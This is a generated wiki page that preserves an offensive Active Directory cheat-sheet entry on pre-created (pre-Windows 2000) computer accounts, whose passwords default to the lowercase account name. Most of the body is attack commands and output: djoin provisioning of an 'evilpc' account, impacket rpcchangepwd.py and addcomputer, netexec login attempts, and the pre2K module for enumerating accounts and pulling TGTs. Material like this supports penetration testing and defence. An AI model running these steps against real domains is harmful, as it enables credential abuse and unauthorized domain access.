---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - Pre-Created Computer Account

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-precreated-computer` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-precreated-computer.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

When Assign this computer account as a pre-Windows 2000 computer checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have th

## Preserved Body

````markdown
When `Assign this computer account as a pre-Windows 2000 computer` checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account **SERVERDEMO$** would have the password **serverdemo**.

```ps1
# Create a machine with default password
# must be run from a domain joined device connected to the domain
djoin /PROVISION /DOMAIN <fqdn> /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
```

* When you attempt to login using the credential you should have the following error code : `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.
* Then you need to change the password with [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)

    ```ps1
    python3 rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'
    ```

:warning: When the machine account name and the password are the same, the machine will also act like a pre-Windows 2000 computer and the authentication will result in `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.

```ps1
$ impacket-addcomputer -dc-ip 10.10.10.10 EXODIA.LOCAL/Administrator:P@ssw0rd -computer-name swkserver -computer-pass swkserver
[*] Successfully added machine account swkserver$ with password swkserver.

$ nxc smb 10.10.10.10 -u 'swkserver$' -p swkserver    
SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-8OJFTLMU1IG) (domain:EXODIA.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.10    445    WIN-8OJFTLMU1IG  [-] EXODIA.LOCAL\swkserver$:swkserver STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

## Enumerate Pre-Created Computer Account

Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each

```ps1
nxc -u username -p password -M pre2K
```

## References

* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
````

## Source Verification

[source record](../../sources/internalallthethings/password-pre-created-computer-account.md)

## Evidence Excerpt

````text
_body: "# Password - Pre-Created Computer Account\n\nWhen `Assign this computer account as a pre-Windows 2000 computer` checkmark\
\ is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance,\
\ the computer account **SERVERDEMO$** would have the password **serverdemo**.\n\n```ps1\n# Create a machine with default\
\ password\n# must be run from a domain joined device connected to the domain\ndjoin /PROVISION /DOMAIN <fqdn> /MACHINE\
\ evilpc /SAVEFILE C:\\temp\\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc\n```\n\n* When you attempt to login using the\
\ credential you should have the following error code : `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.\n* Then you need to\
\ change the password with [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304)\n\n    ```ps1\n    python3\
\ rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'\n    ```\n\n:warning: When the machine account\
````
